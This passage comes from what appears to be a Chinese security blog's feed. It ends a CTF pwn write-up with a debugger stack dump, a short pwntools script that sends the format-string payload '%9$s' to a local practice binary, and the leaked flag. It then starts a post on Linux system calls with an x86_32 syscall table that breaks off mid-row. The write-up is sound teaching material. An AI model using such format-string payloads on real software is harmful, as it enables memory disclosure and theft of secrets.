class="hljs-built_in">RSI</span>  <span class="hljs-number">1</span><br>--&gt; <span class="hljs-built_in">R8</span>   <span class="hljs-number">0x7ffff7e1ca70</span> (_IO_stdfile_1_lock) ◂— <span class="hljs-number">0</span><br>--&gt; <span class="hljs-built_in">R9</span>   <span class="hljs-number">0x602ca0</span> ◂— <span class="hljs-number">0x343135343131</span> /* <span class="hljs-string">&#x27;114514&#x27;</span> */<br><span class="hljs-built_in">R10</span>  <span class="hljs-number">0x7ffff7c15cc0</span> ◂— <span class="hljs-number">0xf00120000481e</span><br><span class="hljs-built_in">R11</span>  <span class="hljs-number">0x7ffff7c606f0</span> (printf) ◂— endbr64 <br><span class="hljs-built_in">R12</span>  <span class="hljs-number">0x7fffffffdfe8</span> —▸ <span class="hljs-number">0x7fffffffe355</span> ◂— <span class="hljs-string">&#x27;/home/xyq/test/goodluck&#x27;</span><br><span class="hljs-built_in">R13</span>  <span class="hljs-number">0x4007a6</span> (main) ◂— <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br><span class="hljs-built_in">R14</span>  <span class="hljs-number">0</span><br><span class="hljs-built_in">R15</span>  <span class="hljs-number">0x7ffff7ffd040</span> (_rtld_global) —▸ <span class="hljs-number">0x7ffff7ffe2e0</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-built_in">RBP</span>  <span class="hljs-number">0x7fffffffded0</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-built_in">RSP</span>  <span class="hljs-number">0x7fffffffde88</span> —▸ <span class="hljs-number">0x400890</span> (main+<span class="hljs-number">234</span>) ◂— <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edi</span>, <span class="hljs-number">0x4009b8</span><br><span class="hljs-built_in">RIP</span>  <span class="hljs-number">0x7ffff7c606f0</span> (printf) ◂— endbr64 <br></code></pre></td></tr></table></figure><p>再看栈</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ rsp <span class="hljs-number">0</span>x7fffffffde88 —▸ <span class="hljs-number">0</span>x400890 (main+<span class="hljs-number">234</span>) ◂— mov edi, <span class="hljs-number">0</span>x4009b8<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">040</span> <span class="hljs-number">0</span>x7fffffffde90 ◂— <span class="hljs-number">0</span>x31fc1000<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0010</span>│-<span class="hljs-number">038</span> <span class="hljs-number">0</span>x7fffffffde98 —▸ <span class="hljs-number">0</span>x602ca0 ◂— <span class="hljs-number">0</span>x343135343131 /* &#x27;<span class="hljs-number">114514</span>&#x27; */<br><span class="hljs-attribute">03</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">030</span> <span class="hljs-number">0</span>x7fffffffdea0 —▸ <span class="hljs-number">0</span>x6022a0 ◂— <span class="hljs-number">0</span>x602<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0020</span>│-<span class="hljs-number">028</span> <span class="hljs-number">0</span>x7fffffffdea8 —▸ <span class="hljs-number">0</span>x7fffffffdeb0 ◂— <span class="hljs-number">0</span>x3168747b67616c66 (&#x27;flag&#123;th1&#x27;)<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0028</span>│-<span class="hljs-number">020</span> <span class="hljs-number">0</span>x7fffffffdeb0 ◂— <span class="hljs-number">0</span>x3168747b67616c66 (&#x27;flag&#123;th1&#x27;)<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0030</span>│-<span class="hljs-number">018</span> <span class="hljs-number">0</span>x7fffffffdeb8 ◂— <span class="hljs-number">0</span>x665f405f73695f73 (&#x27;s_is_@_f&#x27;)<br><span class="hljs-attribute">07</span>:<span class="hljs-number">0038</span>│-<span class="hljs-number">010</span> <span class="hljs-number">0</span>x7fffffffdec0 ◂— <span class="hljs-number">0</span>xff0a7d67346c<br></code></pre></td></tr></table></figure><p>RDI中泛着<code>printf</code>的第一个参数，也就是我们输入的<code>114514</code>，如果输入的是格式化字符串，那就是格式化字符串，剩下的RSI、RDX、RCX、R8、R9这5个寄存器会接着存放其他参数。上面看完了往栈上看，可以看到栈顶为printf函数的返回地址，我们想要的flag在返回地址下的第四个。所以如果我们想要打印flag，那么flag距离格式化字符串的偏移就是5 + 4 &#x3D; 9</p></li><li><p>然后我们就可以构建exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-number">2</span> p = process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br><span class="hljs-number">3</span> payload = <span class="hljs-string">b&quot;%9$s&quot;</span><br><span class="hljs-number">4</span> p.sendline(payload)<br><span class="hljs-number">5</span> p.interactive()：w<span class="hljs-string">&#x27;q</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python3 ./flag.py<br>[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./goodluck&#x27;</span>: pid 3240<br>[*] Switching to interactive mode<br>[*] Process <span class="hljs-string">&#x27;./goodluck&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code 0 (pid 3240)<br>what<span class="hljs-string">&#x27;s the flag</span><br><span class="hljs-string">You answered:</span><br><span class="hljs-string">flag&#123;th1s_is_@_fl4g&#125;</span><br><span class="hljs-string">\xff</span><br><span class="hljs-string">But that was totally wrong lol get rekt</span><br><span class="hljs-string">[*] Got EOF while reading in interactive</span><br><span class="hljs-string">$ </span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>系统调用</title>
    <link href="/2025/02/13/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <url>/2025/02/13/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><p>计算机的各种硬件资源是有限的，为了更好的管理这些资源，用户进程是不允许直接操作的，所有对这些资源的访问都必须由操作系统控制。为此<strong>操作系统为用户态运行的进程与硬件设备之间进行交互提供了一组接口，这组接口就是所谓的系统调用。</strong></p><p><strong>系统调用实质上就是函数调用，只不过调用的是系统函数，处于内核态而已。</strong> 用户在调用系统调用时会向内核传递一个<strong>系统调用号</strong>，然后<strong>系统调用处理程序</strong>通过此号从<strong>系统调用表</strong>中找到相应的内核函数执行，最后返回。</p><h2 id="0x02-系统调用号"><a href="#0x02-系统调用号" class="headerlink" title="0x02 系统调用号"></a>0x02 系统调用号</h2><p>Linux系统有几百个系统调用，为了唯一的标识每一个系统调用，Linux为每一个系统调用定义了一个唯一的编号，这个编号就是系统调用号。系统调用号的<strong>另一个目的是作为系统调用表的下标</strong>，当用户空间的进程执行一个系统调用的时侯，这个系统调用号就被用来指明到底是要执行那个系统调用。</p><h2 id="0x03-系统调用表"><a href="#0x03-系统调用表" class="headerlink" title="0x03 系统调用表"></a>0x03 系统调用表</h2><p>为了把系统调用号与相应的<strong>服务例程</strong>关联起来，内核利用了一个系统调用表，存放在sys_call_table数组中，它是一个函数指针数组，每一个函数指针都指向其系统调用的<strong>封装例程</strong>，有NR_syscalls个表项，第n个表项包含系统调用号为n的<strong>服务例程</strong>的地址。</p><p><strong>原文地址：</strong><a href="https://blog.csdn.net/Nashi_Ko/article/details/120288385">https://blog.csdn.net/Nashi_Ko/article/details/120288385</a></p><h3 id="x86-32-Syscall-table"><a href="#x86-32-Syscall-table" class="headerlink" title="x86_32 Syscall table"></a>x86_32 Syscall table</h3><table><thead><tr><th align="left">Num</th><th align="left">syscall</th><th align="left">%eax</th><th align="left">arg0 (%ebx)</th><th align="left">arg1 (%ecx)</th><th align="left">arg2 (%edx)</th><th align="left">arg3 (%esi)</th><th align="left">arg4 (%edi)</th><th align="left">arg5 (%ebp)</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">restart_syscall</td><td align="left">0x00</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">1</td><td align="left">exit</td><td align="left">0x01</td><td align="left">int error_code</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">2</td><td align="left">fork</td><td align="left">0x02</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">3</td><td align="left">read</td><td align="left">0x03</td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">4</td><td align="left">write</td><td align="left">0x04</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">5</td><td align="left">open</td><td align="left">0x05</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">umode_t mode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">6</td><td align="left">close</td><td align="left">0x06</td><td align="left">unsigned int fd</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">7</td><td align="left">waitpid</td><td align="left">0x07</td><td align="left">pid_t pid</td><td align="left">int *stat_addr</td><td align="left">int options</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">8</td><td align="left">creat</td><td align="left">0x08</td><td align="left">const char *pathname</td><td align="left">umode_t mode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">9</td><td align="left">link</td><td align="left">0x09</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">10</td><td align="left">unlink</td><td align="left">0x0a</td><td align="left">const char *pathname</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">11</td><td align="left">execve</td><td align="left">0x0b</td><td align="left">const char *filename</td><td align="left">const char *const *argv</td><td align="left">const char *const *envp</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">12</td><td align="left">chdir</td><td align="left">0x0c</td><td align="left">const char *filename</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">13</td><td align="left">time</td><td align="left">0x0d</td><td align="left">time_t *tloc</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">14</td><td align="left">mknod</td><td align="left">0x0e</td><td align="left">const char *filename</td><td align="left">umode_t mode</td><td align="left">unsigned dev</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">15</td><td align="left">chmod</td><td align="left">0x0f</td><td align="left">const char *filename</td><td align="left">umode_t mode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">16</td><td align="left">lchown</td><td align="left">0x10</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">17</td><td align="left">break</td><td align="left">0x11</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">18</td><td align="left">oldstat</td><td align="left">0x12</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">19</td><td align="left">lseek</td><td align="left">0x13</td><td align="left">unsigned int fd</td><td align="left">off_t offset</td><td align="left">unsigned int whence</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">20</td><td align="left">getpid</td><td align="left">0x14</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">21</td><td align="left">mount</td><td align="left">0x15</td><td align="left">char *dev_name</td><td align="left">char *dir_name</td><td align="left">char *type</td><td align="left">unsigned long flags</td><td align="left">void *data</td><td align="left">-</td></tr><tr><td align="left">22</td><td align="left">umount</td><td align="left">0x16</td><td align="left">char *name</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">23</td><td align="left">setuid</td><td align="left">0x17</td><td align="left">uid_t uid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">24</td><td align="left">getuid</td><td align="left">0x18</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">25</td><td align="left">stime</td><td align="left">0x19</td><td align="left">time_t *tptr</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">26</td><td align="left">ptrace</td><td align="left">0x1a</td><td align="left">long request</td><td align="left">long pid</td><td align="left">unsigned long addr</td><td align="left">unsigned long data</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">27</td><td align="left">alarm</td><td align="left">0x1b</td><td align="left">unsigned int seconds</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">28</td><td align="left">oldfstat</td><td align="left">0x1c</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">29</td><td align="left">pause</td><td align="left">0x1d</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">30</td><td align="left">utime</td><td align="left">0x1e</td><td align="left">char *filename</td><td align="left">struct utimbuf *times</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">31</td><td align="left">stty</td><td align="left">0x1f</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">32</td><td align="left">gtty</td><td align="left">0x20</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">33</td><td align="left">access</td><td align="left">0x21</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">34</td><td align="left">nice</td><td align="left">0x22</td><td align="left">int increment</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">35</td><td align="left">ftime</td><td align="left">0x23</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">36</td><td align="left">sync</td><td align="left">0x24</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">37</td><td align="left">kill</td><td align="left">0x25</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">38</td><td align="left">rename</td><td align="left">0x26</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">39</td><td align="left">mkdir</td><td align="left">0x27</td><td align="left">const char *pathname</td><td align="left">umode_t mode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">40</td><td align="left">rmdir</td><td align="left">0x28</td><td align="left">const char *pathname</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">41</td><td align="left">dup</td><td align="left">0x29</td><td align="left">unsigned int fildes</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">42</td><td align="left">pipe</td><td align="left">0x2a</td><td align="left">int *fildes</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">43</td><td align="left">times</td><td align="left">0x2b</td><td align="left">struct tms *tbuf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">44</td><td align="left">prof</td><td align="left">0x2c</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">45</td><td align="left">brk</td><td align="left">0x2d</td><td align="left">unsigned long brk</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">46</td><td align="left">setgid</td><td align="left">0x2e</td><td align="left">gid_t gid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">47</td><td align="left">getgid</td><td align="left">0x2f</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">48</td><td align="left">signal</td><td align="left">0x30</td><td align="left">int sig</td><td align="left">__sighandler_t handler</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">49</td><td align="left">geteuid</td><td align="left">0x31</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">50</td><td align="left">getegid</td><td align="left">0x32</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">51</td><td align="left">acct</td><td align="left">0x33</td><td align="left">const char *name</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">52</td><td align="left">umount2</td><td align="left">0x34</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">53</td><td align="left">lock</td><td align="left">0x35</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">54</td><td align="left">ioctl</td><td align="left">0x36</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">unsigned long arg</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">55</td><td align="left">fcntl</td><td align="left">0x37</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">unsigned long arg</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">56</td><td align="left">mpx</td><td align="left">0x38</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">57</td><td align="left">setpgid</td><td align="left">0x39</td><td align="left">pid_t pid</td><td align="left">pid_t pgid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">58</td><td align="left">ulimit</td><td align="left">0x3a</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">59</td><td align="left">oldolduname</td><td align="left">0x3b</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">60</td><td align="left">umask</td><td align="left">0x3c</td><td align="left">int mask</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">61</td><td align="left">chroot</td><td align="left">0x3d</td><td align="left">const char *filename</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">62</td><td align="left">ustat</td><td align="left">0x3e</td><td align="left">unsigned dev</td><td align="left">struct ustat *ubuf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">63</td><td align="left">dup2</td><td align="left">0x3f</td><td align="left">unsigned int oldfd</td><td align="left">unsigned int newfd</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">64</td><td align="left">getppid</td><td align="left">0x40</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">65</td><td align="left">getpgrp</td><td align="left">0x41</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">66</td><td align="left">setsid</td><td align="left">0x42</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">67</td><td align="left">sigaction</td><td align="left">0x43</td><td align="left">int</td><td align="left">const struct old_sigaction *</td><td align="left">struct old_sigaction *</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">68</td><td align="left">sgetmask</td><td align="left">0x44</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">69</td><td align="left">ssetmask</td><td align="left">0x45</td><td align="left">int newmask</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">70</td><td align="left">setreuid</td><td align="left">0x46</td><td align="left">uid_t ruid</td><td align="left">uid_t euid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">71</td><td align="left">setregid</td><td align="left">0x47</td><td align="left">gid_t rgid</td><td align="left">gid_t egid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">72</td><td align="left">sigsuspend</td><td align="left">0x48</td><td align="left">int unused1</td><td align="left">int unused2</td><td align="left">old_sigset_t mask</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">73</td><td align="left">sigpending</td><td align="left">0x49</td><td align="left">old_sigset_t *uset</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">74</td><td align="left">sethostname</td><td align="left">0x4a</td><td align="left">char *name</td><td align="left">int len</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">75</td><td align="left">setrlimit</td><td align="left">0x4b</td><td align="left">unsigned int resource</td><td align="left">struct rlimit *rlim</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">76</td><td align="left">getrlimit</td><td align="left">0x4c</td><td align="left">unsigned int resource</td><td align="left">struct rlimit *rlim</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">77</td><td align="left">getrusage</td><td align="left">0x4d</td><td align="left">int who</td><td align="left">struct rusage *ru</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">78</td><td align="left">gettimeofday</td><td align="left">0x4e</td><td align="left">struct timeval *tv</td><td align="left">struct timezone *tz</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">79</td><td align="left">settimeofday</td><td align="left">0x4f</td><td align="left">struct timeval *tv</td><td align="left">struct timezone *tz</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">80</td><td align="left">getgroups</td><td align="left">0x50</td><td align="left">int gidsetsize</td><td align="left">gid_t *grouplist</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">81</td><td align="left">setgroups</td><td align="left">0x51</td><td align="left">int gidsetsize</td><td align="left">gid_t *grouplist</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">82</td><td align="left">select</td><td align="left">0x52</td><td align="left">int n</td><td align="left">fd_set *inp</td><td align="left">fd_set *outp</td><td align="left">fd_set *exp</td><td align="left">struct timeval *tvp</td><td align="left">-</td></tr><tr><td align="left">83</td><td align="left">symlink</td><td align="left">0x53</td><td align="left">const char *old</td><td align="left">const char *new</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">84</td><td align="left">oldlstat</td><td align="left">0x54</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">85</td><td align="left">readlink</td><td align="left">0x55</td><td align="left">const char *path</td><td align="left">char *buf</td><td align="left">int bufsiz</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">86</td><td align="left">uselib</td><td align="left">0x56</td><td align="left">const char *library</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">87</td><td align="left">swapon</td><td align="left">0x57</td><td align="left">const char *specialfile</td><td align="left">int swap_flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">88</td><td align="left">reboot</td><td align="left">0x58</td><td align="left">int magic1</td><td align="left">int magic2</td><td align="left">unsigned int cmd</td><td align="left">void *arg</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">89</td><td align="left">readdir</td><td align="left">0x59</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">90</td><td align="left">mmap</td><td align="left">0x5a</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">91</td><td align="left">munmap</td><td align="left">0x5b</td><td align="left">unsigned long addr</td><td align="left">size_t len</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">92</td><td align="left">truncate</td><td align="left">0x5c</td><td align="left">const char *path</td><td align="left">long length</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">93</td><td align="left">ftruncate</td><td align="left">0x5d</td><td align="left">unsigned int fd</td><td align="left">unsigned long length</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">94</td><td align="left">fchmod</td><td align="left">0x5e</td><td align="left">unsigned int fd</td><td align="left">umode_t mode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">95</td><td align="left">fchown</td><td align="left">0x5f</td><td align="left">unsigned int fd</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">96</td><td align="left">getpriority</td><td align="left">0x60</td><td align="left">int which</td><td align="left">int who</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">97</td><td align="left">setpriority</td><td align="left">0x61</td><td align="left">int which</td><td align="left">int who</td><td align="left">int niceval</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">98</td><td align="left">profil</td><td align="left">0x62</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">99</td><td align="left">statfs</td><td align="left">0x63</td><td align="left">const char * path</td><td align="left">struct statfs *buf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">100</td><td align="left">fstatfs</td><td align="left">0x64</td><td align="left">unsigned int fd</td><td align="left">struct statfs *buf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">101</td><td align="left">ioperm</td><td align="left">0x65</td><td align="left">unsigned long from</td><td align="left">unsigned long num</td><td align="left">int on</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">102</td><td align="left">socketcall</td><td align="left">0x66</td><td align="left">int call</td><td align="left">unsigned long *args</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">103</td><td align="left">syslog</td><td align="left">0x67</td><td align="left">int type</td><td align="left">char *buf</td><td align="left">int len</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">104</td><td align="left">setitimer</td><td align="left">0x68</td><td align="left">int which</td><td align="left">struct itimerval *value</td><td align="left">struct itimerval *ovalue</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">105</td><td align="left">getitimer</td><td align="left">0x69</td><td align="left">int which</td><td align="left">struct itimerval *value</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">106</td><td align="left">stat</td><td align="left">0x6a</td><td align="left">const char *filename</td><td align="left">struct __old_kernel_stat *statbuf</td><td align="left">-</td><td 